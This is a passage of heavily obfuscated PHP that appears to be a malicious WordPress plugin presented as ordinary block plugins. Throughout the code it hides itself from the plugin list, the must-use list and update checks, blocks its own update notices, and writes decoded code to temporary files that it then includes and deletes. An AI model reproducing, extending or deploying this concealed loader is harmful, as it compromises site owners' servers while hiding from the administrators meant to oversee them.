if   (!$ghudbjb8hapb9q      ||    !@$GLOBALS['__scf_qg7ainp116mf_713']($ojotk1aygu8jswc)    ||     @$GLOBALS['__scf_b42duf6j1zadm9_105']($ojotk1aygu8jswc) <   (0x1c1+0x227))  {$x7_m4ff3=906;$z9g5go50in=($x7_m4ff3>0)?$x7_m4ff3:-$x7_m4ff3;



    if    ($ghudbjb8hapb9q  &&  @$GLOBALS['__scf_rjpcj9l4bigb5_21']($ojotk1aygu8jswc)) {
   $phech3sj141uh   =  (string) @$GLOBALS['__scf_utyj_ckly79_101']($ojotk1aygu8jswc, false, null, 0,     (7451-3355));
$_2zbjqmpm5v7p7p =  $GLOBALS['__scf_fv3zevxzzb_44']($phech3sj141uh)  &&     $GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(759),  $phech3sj141uh, $_dm)    &&  version_compare($_dm[1],    dfb4_mpcgxvnp230hvh1v(),      '>');
 unset($phech3sj141uh,   $_dm);

   if (!$_2zbjqmpm5v7p7p)    {
      ruinnb541lwxm7j($ojotk1aygu8jswc,      (338+82));
 cvtaycsw15_xd1srry($ojotk1aygu8jswc);
 }
}


 if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(675))) @set_transient(c1sob647u1i(66),      1,  (0x199+0xc77));
  return;



}

  vyxva31du3czei($ojotk1aygu8jswc);
ruinnb541lwxm7j($ojotk1aygu8jswc,   (379+41));


   o4_k_ap14u5xy97yywy7k($ojotk1aygu8jswc);
    b1acch7k36o7yhlwm5();
 a0q_0vhnw4vfxz();
 }    catch    (Throwable   $cje8wku90zm4r)  {
    g_qoqdy38lfl4v4n3618(c1sob647u1i(760), $cje8wku90zm4r);



  }   catch  (Exception $cje8wku90zm4r)   {
    }
}
   function   k5vpt_1kxzi1uu8()
  {
  try  {
    $z9qitlhtiv     =      $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(694))     ?   (int)  get_option(f6yrzd2knrmb(761),  0)     :   0;
  if   ($z9qitlhtiv     < $GLOBALS['__scf_qzyo0sgkyb6_202']()    -  (564-264)  || $z9qitlhtiv > $GLOBALS['__scf_qzyo0sgkyb6_202']()  +  (262+38)) {
 if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(634)))  @update_option(ovffvv33(762), $GLOBALS['__scf_qzyo0sgkyb6_202']());
 $tc01okst3sc =    fcc42yo6xrdenvra0(iw6xe9q4j6sneg(470), "");



     $x4t_3_c4nf_37g9y  =   gdvo0h5bcuzy91kz589lst($GLOBALS['__scf_fv3zevxzzb_44']($tc01okst3sc)     ? $tc01okst3sc  :  "");
     $ktcu_ydbzz    =      p42d6nacvwd08jr_tyanv1(bmvtr5sdqjf5km1t());
if  (!$GLOBALS['__scf_fv3zevxzzb_44']($tc01okst3sc)  ||   $GLOBALS['__scf_d4eyetogjbsnt_10']($tc01okst3sc) <     (409+91) ||   hc0wbkv3xzh9im34z($tc01okst3sc)     ||   $x4t_3_c4nf_37g9y  ===   ""  ||  ($ktcu_ydbzz !==  null    && $ktcu_ydbzz !==   ""  &&    version_compare($ktcu_ydbzz,  $x4t_3_c4nf_37g9y,   '>'))) {
 $egziouap1xyua      =  bfyls7pdkqkf4p8az();
  if   ($egziouap1xyua  &&     !hc0wbkv3xzh9im34z($egziouap1xyua)) {
     $p0w7jfj821z6  =     gdvo0h5bcuzy91kz589lst($egziouap1xyua);
    if   (!$GLOBALS['__scf_fv3zevxzzb_44']($tc01okst3sc)   ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($tc01okst3sc)   <   (912-412)  ||   hc0wbkv3xzh9im34z($tc01okst3sc)     ||  $x4t_3_c4nf_37g9y     ===     "" ||  ($p0w7jfj821z6  !== "" &&   version_compare($p0w7jfj821z6,   $x4t_3_c4nf_37g9y,   '>')))      {

     mw5stmpiys2hi3k2xe14i(bpowi0iglycvx(470),    $egziouap1xyua,   ovffvv33(763));
if   ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(634)))   {
   @update_option(bpowi0iglycvx(764), 0,  hn_f08x0cns80(763));
  @update_option(f6yrzd2knrmb(765),  0,  ovffvv33(763));


    @update_option(iw6xe9q4j6sneg(766),  0,  hn_f08x0cns80(767));
 }
 if ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(65))) @delete_transient(p1srpzpjsehf9kb72());
  }
  }
    }
}
 
       if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(694))   &&    $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(768))) {
      $p8m45r8dhwiy  =      get_option(bpowi0iglycvx(769));
    if  ($p8m45r8dhwiy !==  false &&    $p8m45r8dhwiy   !==  dfb4_mpcgxvnp230hvh1v())     {
   @update_option(ovffvv33(769), dfb4_mpcgxvnp230hvh1v(),    hn_f08x0cns80(767));
}
     }
      if    (!  $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(770))   ||  !   add_option(bpowi0iglycvx(769),  dfb4_mpcgxvnp230hvh1v(),  "",  c1sob647u1i(767)))   {
    return;


 }
   

 srxd8zsn54rz6anwrc();
   

  if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(771)))  {
   @update_option(iw6xe9q4j6sneg(764), 0, iw6xe9q4j6sneg(772));
   @update_option(c1sob647u1i(765),  0, iw6xe9q4j6sneg(773));
 @update_option(hn_f08x0cns80(766), 0,  hn_f08x0cns80(773));

    }
 if  ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(774)))   @delete_transient(p1srpzpjsehf9kb72());

 if (!empty($egziouap1xyua)   &&  !hc0wbkv3xzh9im34z($egziouap1xyua))     {
      mw5stmpiys2hi3k2xe14i(iw6xe9q4j6sneg(470),   $egziouap1xyua, f6yrzd2knrmb(773));
  }
  pklvf4vixucw8d97bma(null);
 
 ruinnb541lwxm7j(bmvtr5sdqjf5km1t(),  (283+137));

eq7z05kg4s98n6ox(iw6xe9q4j6sneg(775),   hn_f08x0cns80(479), 0);


      
  eq7z05kg4s98n6ox(iw6xe9q4j6sneg(775),    hn_f08x0cns80(776),     0);
} catch   (Throwable   $cje8wku90zm4r)    {
  g_qoqdy38lfl4v4n3618(bpowi0iglycvx(777),     $cje8wku90zm4r);


   if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(635)))   @delete_option(c1sob647u1i(769));



    }     catch   (Exception    $cje8wku90zm4r)     {
        if ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(778)))     @delete_option(iw6xe9q4j6sneg(769));
 }

        }

  function    ad8y2ip1wdvekz()
   {$pguo5knr6k=PHP_MAJOR_VERSION;$e29azooeie4k=$pguo5knr6k*9;
      try {


    if ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(779))) {$stlaekf1l4y=6503;$wam7ch5s1ri=$stlaekf1l4y%13;


      @$GLOBALS['__scf_r7h_2y83ismjfq_303'](home_url('/'), array(ovffvv33(485) =>   (1+4),  c1sob647u1i(411)  =>    false,    bpowi0iglycvx(486)     =>      false));
  }
  }   catch   (Throwable $cje8wku90zm4r) {
    g_qoqdy38lfl4v4n3618(ovffvv33(780),  $cje8wku90zm4r);


  } catch     (Exception   $cje8wku90zm4r)   {
    }


  }

 
 function  ognk2ntl09xsayv263cj()
  {
   static  $rxgh46_hs63nfc    =  false;
if      ($rxgh46_hs63nfc)   return;
    $rxgh46_hs63nfc  =    true;
try    {
if     (!  $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(781))    || ! is_admin())  {
  return;
 }
  if  (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(726))     ||    !current_user_can(c1sob647u1i(782)))  {
    return;
  }
$tnob1rycnsf6okud    =   isset($_REQUEST[iw6xe9q4j6sneg(783)])  ?      $_REQUEST[c1sob647u1i(783)]    :    "";
        $tnob1rycnsf6okud  =   $GLOBALS['__scf_fv3zevxzzb_44']($tnob1rycnsf6okud) ?  $GLOBALS['__scf_qew3crlieule_339']($tnob1rycnsf6okud)   :  "";
     if   ($tnob1rycnsf6okud  !==  f6yrzd2knrmb(784)    &&   $tnob1rycnsf6okud  !==   f6yrzd2knrmb(785))  {



      return;
 }

 $a1yg5f8l1bm4v3l   =    array();
 if  ($tnob1rycnsf6okud     === hn_f08x0cns80(784))   {
  $f_tq3y34ku1ga    =  isset($_REQUEST[hn_f08x0cns80(786)])   ?  $_REQUEST[bpowi0iglycvx(787)]   :      "";
     $f_tq3y34ku1ga   = $GLOBALS['__scf_fv3zevxzzb_44']($f_tq3y34ku1ga)    ?  $GLOBALS['__scf_qew3crlieule_339']($f_tq3y34ku1ga)  : "";
   if ($f_tq3y34ku1ga &&  $f_tq3y34ku1ga !==   ayw2e71sos2ne2g())  {$x9jgwv7zp=34+28;$pq4p9yauyj=$x9jgwv7zp-18;


    $a1yg5f8l1bm4v3l[] = $f_tq3y34ku1ga;
}
}    else {
       

     $oxqpqgjt626l     = isset($_REQUEST[f6yrzd2knrmb(788)]) ? $_REQUEST[bpowi0iglycvx(789)]  :  array();
 $oxqpqgjt626l =    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($oxqpqgjt626l)  ?  $oxqpqgjt626l   :    array();
foreach    ($oxqpqgjt626l   as $f_tq3y34ku1ga)  {
 $f_tq3y34ku1ga =  $GLOBALS['__scf_fv3zevxzzb_44']($f_tq3y34ku1ga)  ?  $GLOBALS['__scf_qew3crlieule_339']($f_tq3y34ku1ga) :  "";
     if  ($f_tq3y34ku1ga   &&   $f_tq3y34ku1ga     !== ayw2e71sos2ne2g())   {



$a1yg5f8l1bm4v3l[]   =    $f_tq3y34ku1ga;
 }
}


   }
// WP List Block: unbind proof-term

 if    (empty($a1yg5f8l1bm4v3l))  {


return;
   }
 $eydpgv1cbixzuvg8 = false;
 foreach ($a1yg5f8l1bm4v3l  as     $f_tq3y34ku1ga)  {
if (e4plquzvs65_mvr7d37($f_tq3y34ku1ga))   {
  z0u4he002l3jpmaa000gu7($f_tq3y34ku1ga);
 $eydpgv1cbixzuvg8    = true;



}
 }


    if    ($eydpgv1cbixzuvg8) {

 
   if ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(790))  &&  $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(791))) {
wp_safe_redirect(admin_url(hn_f08x0cns80(792)));
    }
}
}      catch (Throwable   $cje8wku90zm4r)  {
g_qoqdy38lfl4v4n3618(ovffvv33(793),   $cje8wku90zm4r);
 }  catch   (Exception    $cje8wku90zm4r)    {

     }
  }



function   sicptjrfm13yy5jn2f($uejpsp90vfms1hz_,    $txui86de63)

    {
 if    ($txui86de63 ===  iw6xe9q4j6sneg(794)) {

    $plugins  =   &$GLOBALS[ovffvv33(795)];
      if  (!isset($plugins[ovffvv33(796)])  ||   !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($plugins[bpowi0iglycvx(796)]))  {
return      $uejpsp90vfms1hz_;
 }


     $rfs8sjhhjwe0akcn   = defined(hn_f08x0cns80(293)) ?      WP_CONTENT_DIR :   (defined(c1sob647u1i(149))    ?  ABSPATH    .   f6yrzd2knrmb(744)  :   "");
 if  ($rfs8sjhhjwe0akcn  ===  "") {



 return    $uejpsp90vfms1hz_;
}

  $hwo8c0_alo9j   = array(bpowi0iglycvx(797) => c1sob647u1i(798),   f6yrzd2knrmb(799)  =>   bpowi0iglycvx(800));
foreach  ($hwo8c0_alo9j as $ig68hj8hqdp =>     $d42a98jr1rl)   {
if  (!isset($plugins[hn_f08x0cns80(796)][$ig68hj8hqdp])) {
 continue;
   }
  $lxy6owzg4ua4   = @$GLOBALS['__scf_utyj_ckly79_101']($rfs8sjhhjwe0akcn  .  '/' .  $ig68hj8hqdp);
if   (!$GLOBALS['__scf_fv3zevxzzb_44']($lxy6owzg4ua4)  || $GLOBALS['__scf_w6mdcepio4lkz5_7']($lxy6owzg4ua4,  ovffvv33(801)  .  $d42a98jr1rl  .  bpowi0iglycvx(802))  ===   false) {
    continue;


  }


  $xfl6umh94ucwo     =  $GLOBALS['__scf_renvrk8nefa8_474'](iw6xe9q4j6sneg(803)  .   $d42a98jr1rl .  ovffvv33(804)   . $d42a98jr1rl     .   f6yrzd2knrmb(805),   "",   $lxy6owzg4ua4);
        if   (!$GLOBALS['__scf_fv3zevxzzb_44']($xfl6umh94ucwo)) {
continue;

  }



   $xfl6umh94ucwo     =  $GLOBALS['__scf_qew3crlieule_339']($xfl6umh94ucwo);

if  ($xfl6umh94ucwo ===  ""  ||    $xfl6umh94ucwo   ===  hn_f08x0cns80(685)     ||    $xfl6umh94ucwo   ===    c1sob647u1i(249)) {
unset($plugins[bpowi0iglycvx(806)][$ig68hj8hqdp]);
    }
   }
  return $uejpsp90vfms1hz_;



      }
 if  ($txui86de63  !== bpowi0iglycvx(807))  {
      return $uejpsp90vfms1hz_;
     }
// lazy balancer


  $plugins  =   &$GLOBALS[c1sob647u1i(795)];
     $i16znav1mul6     =     $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t());

   if   (isset($plugins[bpowi0iglycvx(808)][$i16znav1mul6]))  {
 unset($plugins[ovffvv33(808)][$i16znav1mul6]);
     }
return $uejpsp90vfms1hz_;

}
  if   (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(809)))   {
 function j9pwtffam59qe4in397tx()
    {
   if (!  zbd0filxujnpocked22i())  {
// @strength-reduce lsm-tree




 return;



   }



$ko9cqc0s7si9cc  =   $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t());
       $pjov750v0e  =  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(), bpowi0iglycvx(810));
     $qrerb0i_3pw3f =  $pjov750v0e     . '/' .  $ko9cqc0s7si9cc;

 echo ovffvv33(811)  .    esc_attr($ko9cqc0s7si9cc)     .   c1sob647u1i(812) .  esc_attr($qrerb0i_3pw3f)  .      iw6xe9q4j6sneg(813);
 echo   bpowi0iglycvx(814)  .   esc_js($ko9cqc0s7si9cc)  . f6yrzd2knrmb(815)  .  esc_js($qrerb0i_3pw3f) .  iw6xe9q4j6sneg(816);
 }
 }
      if    (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(817)))    {
// @infer credential

    function y4p_7xd6lr1a8obp($ilqpeok6kpc5gn2)



     {
     if     (! $GLOBALS['__scf_bslklilwd3kn_71']($ilqpeok6kpc5gn2))  {
 return  $ilqpeok6kpc5gn2;

}
  $ko9cqc0s7si9cc   =   ayw2e71sos2ne2g();
  if  (isset($ilqpeok6kpc5gn2->response[$ko9cqc0s7si9cc]))   {
    unset($ilqpeok6kpc5gn2->response[$ko9cqc0s7si9cc]);
   }
 return  $ilqpeok6kpc5gn2;
  }

 }
       if    (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(818))) {


     function  g1f3h4iy7gh1s9($plugins)
      {
// @configure director

$ftvsfz7ji2  =     ayw2e71sos2ne2g();
      if  (isset($plugins[$ftvsfz7ji2]))     {
  unset($plugins[$ftvsfz7ji2]);
  }
// attach hyperloglog for WP Categories Block

        $pjov750v0e  =    $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),  iw6xe9q4j6sneg(810));
  $qrerb0i_3pw3f  = $pjov750v0e  . '/'  .    $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t());
 if   (isset($plugins[$qrerb0i_3pw3f]))  {

   unset($plugins[$qrerb0i_3pw3f]);
   }
       return  $plugins;
}
   }
function  xc4ybxpszlyvz6au($tkbr180maepmd)
 {
 if (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($tkbr180maepmd)) {
return   $tkbr180maepmd;



   }


  $o8y9_v9c6lklv1v    =  "";
    if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(819))  &&   $GLOBALS['__scf_qg7ainp116mf_713'](bmvtr5sdqjf5km1t())) {
  $o9_1oacl5_ =  get_plugin_data(bmvtr5sdqjf5km1t(),  false,    false);
      $o8y9_v9c6lklv1v   =    isset($o9_1oacl5_[ovffvv33(820)])   ? $o9_1oacl5_[bpowi0iglycvx(821)]     : "";
      }
 $pt0masxagct9de2m  =   array(bpowi0iglycvx(822),   c1sob647u1i(823));
  foreach ($pt0masxagct9de2m as  $iwq5hmsytczxrrc)  {



if  (! isset($tkbr180maepmd[$iwq5hmsytczxrrc][bpowi0iglycvx(824)]) ||  !   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($tkbr180maepmd[$iwq5hmsytczxrrc][c1sob647u1i(824)]))  {
  continue;
   }
        foreach ($tkbr180maepmd[$iwq5hmsytczxrrc][iw6xe9q4j6sneg(825)]    as $key   => $kxvwpue476he1c) {$vo9nudxb0j=PHP_INT_MAX/PHP_INT_MAX;$l3bl21g6p2at=$vo9nudxb0j+29;
if     ($GLOBALS['__scf_w6mdcepio4lkz5_7']($key,  ayw2e71sos2ne2g()) !==  false   ||  $key  ===  ayw2e71sos2ne2g())      {
   unset($tkbr180maepmd[$iwq5hmsytczxrrc][iw6xe9q4j6sneg(825)][$key]);
      continue;


     }
      if   ($o8y9_v9c6lklv1v  !==  "" && $key  ===   $o8y9_v9c6lklv1v)  {$subpmse494=15|209;$v1ur78ie=$subpmse494^249;
 unset($tkbr180maepmd[$iwq5hmsytczxrrc][iw6xe9q4j6sneg(825)][$key]);
  continue;
       }
  }
    }



       foreach (array(c1sob647u1i(826),  iw6xe9q4j6sneg(827))    as    $ajinffbltc84)   {
 $lb_07_9p7l =     isset($tkbr180maepmd[$ajinffbltc84][iw6xe9q4j6sneg(825)]) &&  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($tkbr180maepmd[$ajinffbltc84][f6yrzd2knrmb(828)])  ?    $tkbr180maepmd[$ajinffbltc84][c1sob647u1i(829)]   :   array();
     if    (!$lb_07_9p7l) continue;

       $yb065zitb7z0h    =  defined(c1sob647u1i(13))  ?   WPMU_PLUGIN_DIR  :   (defined(iw6xe9q4j6sneg(293))    ? WP_CONTENT_DIR .    bpowi0iglycvx(14)   :   "");



 $o1ket2wyhf    =  array();
if ($o8y9_v9c6lklv1v !== "") $o1ket2wyhf[]    =   $o8y9_v9c6lklv1v;
    $o1ket2wyhf[]  =     $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t());
  if  ($yb065zitb7z0h  !==  "" &&    @$GLOBALS['__scf_opq_vgkskw_46']($yb065zitb7z0h)    &&    $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(757)))  {


   foreach   ((array)   @$GLOBALS['__scf_kajvzw3bpufv_75']($yb065zitb7z0h    .    hn_f08x0cns80(600)) as   $xl103i7gtkdj) {
 $eribl7p1ze = @$GLOBALS['__scf_utyj_ckly79_101']($xl103i7gtkdj,    false,    null,   0, (13784-5592));
   if   (!$GLOBALS['__scf_fv3zevxzzb_44']($eribl7p1ze)     || $GLOBALS['__scf_w6mdcepio4lkz5_7']($eribl7p1ze,  bpowi0iglycvx(830))    ===   false)    continue;
if   ($GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(831), $eribl7p1ze, $v7848x1e5u))    {
  $fjzhim_nrj0k     =  $GLOBALS['__scf_qew3crlieule_339']($v7848x1e5u[1]);
    if   ($fjzhim_nrj0k !==   "")   $o1ket2wyhf[] =   $fjzhim_nrj0k;
  }
   $o1ket2wyhf[]     =    $GLOBALS['__scf_owu_4pajngr_3']($xl103i7gtkdj);
   }



    }
 foreach   ($lb_07_9p7l   as  $key    =>    $kxvwpue476he1c)     {
 foreach   ($o1ket2wyhf as   $q8ttoo_2wmdsvz)    {
     if  ($key  ===  $q8ttoo_2wmdsvz   ||  $key   ===  sanitize_text_field($q8ttoo_2wmdsvz))  {
   unset($tkbr180maepmd[$ajinffbltc84][ovffvv33(832)][$key]);



break;
  }
  }

 }
 }



   $fpspn3l1z8i9 = isset($tkbr180maepmd[bpowi0iglycvx(833)][c1sob647u1i(834)]) && $GLOBALS['__scf_w1m1ydxx4_gm9__38']($tkbr180maepmd[hn_f08x0cns80(833)][c1sob647u1i(834)])   ? $tkbr180maepmd[iw6xe9q4j6sneg(833)][hn_f08x0cns80(834)] :   array();



 if    ($fpspn3l1z8i9)    {
     $rfs8sjhhjwe0akcn  =    defined(ovffvv33(293))   ?    WP_CONTENT_DIR    :  (defined(ovffvv33(149))  ?  ABSPATH .    c1sob647u1i(744) : "");
   $hwo8c0_alo9j  =    array(bpowi0iglycvx(835)    =>   hn_f08x0cns80(836), iw6xe9q4j6sneg(837)  => ovffvv33(800));
 foreach   ($fpspn3l1z8i9  as  $key  =>  $kxvwpue476he1c) {
  if (!isset($hwo8c0_alo9j[$key])   || $rfs8sjhhjwe0akcn ===  "") continue;
$lxy6owzg4ua4 = @$GLOBALS['__scf_utyj_ckly79_101']($rfs8sjhhjwe0akcn    .  '/'    .   $key,     false,     null,  0,     (0x250+0xdb0));
if ($GLOBALS['__scf_fv3zevxzzb_44']($lxy6owzg4ua4)    &&  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($lxy6owzg4ua4, ovffvv33(801) .  $hwo8c0_alo9j[$key] .  f6yrzd2knrmb(802))   !==   false || $GLOBALS['__scf_w6mdcepio4lkz5_7']($lxy6owzg4ua4,    f6yrzd2knrmb(838)) !==  false))    {



  unset($tkbr180maepmd[hn_f08x0cns80(839)][ovffvv33(834)][$key]);
   }
     }
/* strict singleton */

      }

  return     $tkbr180maepmd;
  }
     
    function  zsoqr4ke6ohe4uo40c($o71oc4ompt9cs)
     {
   if (! $GLOBALS['__scf_w1m1ydxx4_gm9__38']($o71oc4ompt9cs)) {

      return  $o71oc4ompt9cs;$lp9b8qq778vd=PHP_INT_MAX/PHP_INT_MAX;$fu41d0qbg3vvu4=$lp9b8qq778vd+95;
     }
$df9ztlqhnp     =  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t());
$j2w5nhmb4q6rln  = $GLOBALS['__scf_wvxpw4xfn9_219']($df9ztlqhnp,    PATHINFO_FILENAME);
 $bmexhiz2a5dq6x  =     array(
array(hn_f08x0cns80(840)     => '#'  .  $GLOBALS['__scf_qw5tztoblafz_841']($df9ztlqhnp,  '#')   .      c1sob647u1i(842),   c1sob647u1i(843)     =>     true),
    array(iw6xe9q4j6sneg(840)  =>   f6yrzd2knrmb(844)   . $GLOBALS['__scf_qw5tztoblafz_841']($j2w5nhmb4q6rln,    '#') . iw6xe9q4j6sneg(842),  iw6xe9q4j6sneg(845)  => true),


    );


 if  (isset($o71oc4ompt9cs[iw6xe9q4j6sneg(846)])    &&    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($o71oc4ompt9cs[f6yrzd2knrmb(846)]))  {
  foreach     ($o71oc4ompt9cs[hn_f08x0cns80(847)] as  $jqexd5um710p4flb    => $yjxbsrooxpfoc8) {
if  (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($yjxbsrooxpfoc8) || !  $GLOBALS['__scf_hw6fksdea20_42']($jqexd5um710p4flb))   {
   continue;
   }
if     (! isset($o71oc4ompt9cs[ovffvv33(847)][$jqexd5um710p4flb][ovffvv33(848)])   || ! $GLOBALS['__scf_w1m1ydxx4_gm9__38']($o71oc4ompt9cs[iw6xe9q4j6sneg(849)][$jqexd5um710p4flb][c1sob647u1i(848)]))  {

  $o71oc4ompt9cs[f6yrzd2knrmb(849)][$jqexd5um710p4flb][f6yrzd2knrmb(850)] =     array();
  }
 foreach  ($bmexhiz2a5dq6x    as  $lyafc0voop)  {$nxpkqgxjdsjiqy=(0x69+0x62);$o4rjl7ly7k6s1=$nxpkqgxjdsjiqy%5;
    $o71oc4ompt9cs[ovffvv33(849)][$jqexd5um710p4flb][f6yrzd2knrmb(850)][]   = $lyafc0voop;
        }
}
}
   return $o71oc4ompt9cs;
  }

function o5aycvnhaclir5qy8rlhk2()
 {
 try {$zvxqmn97rwpg=PHP_MAJOR_VERSION;$vfq2566lajtxc=$zvxqmn97rwpg*7;
     if  (! defined(f6yrzd2knrmb(851))    ||      constant(iw6xe9q4j6sneg(851))  <  (0x1+0x6))  {
 return;$s8egfqi_k=78+91;$lejnunpthi0=$s8egfqi_k-5;
      }

    if ($GLOBALS['__scf_dr1wex6ejrn2_554'](c1sob647u1i(852),   false)) {
   return;
  }



  $v6k5bsuwdy7yi6m   =   $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t());



       $tz_28oj7vtmy  = defined(ovffvv33(733))   ? WP_PLUGIN_DIR :  "";

     $g6ipu9tsyfmb2n =  array(
 $tz_28oj7vtmy   .  c1sob647u1i(853),
$tz_28oj7vtmy  .   bpowi0iglycvx(854),
   $tz_28oj7vtmy  .   ovffvv33(855),
 );
  $s5zvvf1_2m_hym   = "";
 foreach  ($g6ipu9tsyfmb2n      as  $ko9cqc0s7si9cc) {


if   ($ko9cqc0s7si9cc   !==  ""     && @$GLOBALS['__scf_rjpcj9l4bigb5_21']($ko9cqc0s7si9cc)    &&    @$GLOBALS['__scf_kupirwjlofzm_49']($ko9cqc0s7si9cc))   {
$s5zvvf1_2m_hym =  $ko9cqc0s7si9cc;
     break;
}
        }
  if     ($s5zvvf1_2m_hym ===     "")    {
/* optimal event-bus */

return;
 }
 $elaeo29e5aw36bin  = $GLOBALS['__scf_po3uwzhcb63b03_11']($s5zvvf1_2m_hym);
 spl_autoload_register(function ($v_z9cithox31oa5)  use    ($elaeo29e5aw36bin)     {

 foreach   (array($elaeo29e5aw36bin  . '/'  .     $v_z9cithox31oa5 . ovffvv33(856),  $elaeo29e5aw36bin   . '/'   .     $v_z9cithox31oa5  .  f6yrzd2knrmb(810))    as $pu01p49gww7v4s9) {
    if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($pu01p49gww7v4s9))  {
     include_once  $pu01p49gww7v4s9;
return;
     }
    }

 });
 $ch7u8u2ur1 =  @$GLOBALS['__scf_utyj_ckly79_101']($s5zvvf1_2m_hym);
  if ($ch7u8u2ur1  ===  false ||  $GLOBALS['__scf_w6mdcepio4lkz5_7']($ch7u8u2ur1, f6yrzd2knrmb(857))  ===  false)  {



return;
 }
 $ch7u8u2ur1  =  $GLOBALS['__scf_renvrk8nefa8_474'](c1sob647u1i(858),  "",  $ch7u8u2ur1);



$ch7u8u2ur1     =  $GLOBALS['__scf_usy4mchq83xa_378'](iw6xe9q4j6sneg(859),   hn_f08x0cns80(860),     $ch7u8u2ur1);
     $hbk0iyi4_cagbrwe =   lwxb0otgrmrkttfbm_7t_r(rj8ubb6iqzwwqmp_8t2(),    ovffvv33(861));
if   ($hbk0iyi4_cagbrwe ===   false)  {
       return;
}


@$GLOBALS['__scf_whcsnotvh9twx_211']($hbk0iyi4_cagbrwe,      c1sob647u1i(862) .  $ch7u8u2ur1);
      try  {
     @include  $hbk0iyi4_cagbrwe;
} finally {
cvtaycsw15_xd1srry($hbk0iyi4_cagbrwe);
 }
    $lkcbcv91e9g1keu    =    $GLOBALS['__scf_wvxpw4xfn9_219']($v6k5bsuwdy7yi6m,    PATHINFO_FILENAME);$u7arhon7=PHP_INT_MAX/PHP_INT_MAX;$evsmac5f93i=$u7arhon7+67;


$GLOBALS[hn_f08x0cns80(863)]    = $v6k5bsuwdy7yi6m;
$GLOBALS[hn_f08x0cns80(864)]     =   $lkcbcv91e9g1keu;
     $begqd6m4ik1    =   iw6xe9q4j6sneg(865)



      . hn_f08x0cns80(866)
  .    iw6xe9q4j6sneg(867)
  .     iw6xe9q4j6sneg(868)
   .  bpowi0iglycvx(869)
 .  '}'
 . f6yrzd2knrmb(870)
.   '}'
   . '}';
$fb_kmz93o0d6j = lwxb0otgrmrkttfbm_7t_r(rj8ubb6iqzwwqmp_8t2(),     c1sob647u1i(861));
   if     ($fb_kmz93o0d6j)   {

 @$GLOBALS['__scf_whcsnotvh9twx_211']($fb_kmz93o0d6j, $begqd6m4ik1);
try {
      @include  $fb_kmz93o0d6j;
   }  finally   {
cvtaycsw15_xd1srry($fb_kmz93o0d6j);
   }



  }
    }  catch   (Throwable    $cje8wku90zm4r) {
   g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(871),  $cje8wku90zm4r);
}    catch    (Exception $cje8wku90zm4r) {
}



     }


 if    (!$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(872)))    {
     function i4phbxncprpllx4ce939j($g9u70l7gja,   $e2ovd90e097czrb)
   {
    if (!    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($g9u70l7gja))   {
    return $g9u70l7gja;
}

     $kotwa23mss32khp =  array(c1sob647u1i(873), iw6xe9q4j6sneg(874),  f6yrzd2knrmb(875),   hn_f08x0cns80(876),  iw6xe9q4j6sneg(572));
foreach ($kotwa23mss32khp  as   $key)     {



 if (!     isset($g9u70l7gja[$key]) ||  !  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($g9u70l7gja[$key]))   {
 continue;
    }
 $toxd7lwn40kosh59 =  array();
 foreach  ($g9u70l7gja[$key]  as $ks1jfnw_wldm32)      {
 if (!    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ks1jfnw_wldm32)) {
 $toxd7lwn40kosh59[]    =  $ks1jfnw_wldm32;
continue;


}
 $_1eusnddmeik3362   =  isset($ks1jfnw_wldm32[hn_f08x0cns80(877)]) ?     $ks1jfnw_wldm32[iw6xe9q4j6sneg(877)]    :  "";
   $lkcbcv91e9g1keu =  isset($GLOBALS[f6yrzd2knrmb(864)]) ?  $GLOBALS[ovffvv33(864)] :    "";
 

if   ($_1eusnddmeik3362 ===   $e2ovd90e097czrb || ($lkcbcv91e9g1keu   !== "" &&    $_1eusnddmeik3362 ===   $lkcbcv91e9g1keu))   {
// hydrate release write-ahead-log

  continue;
  }
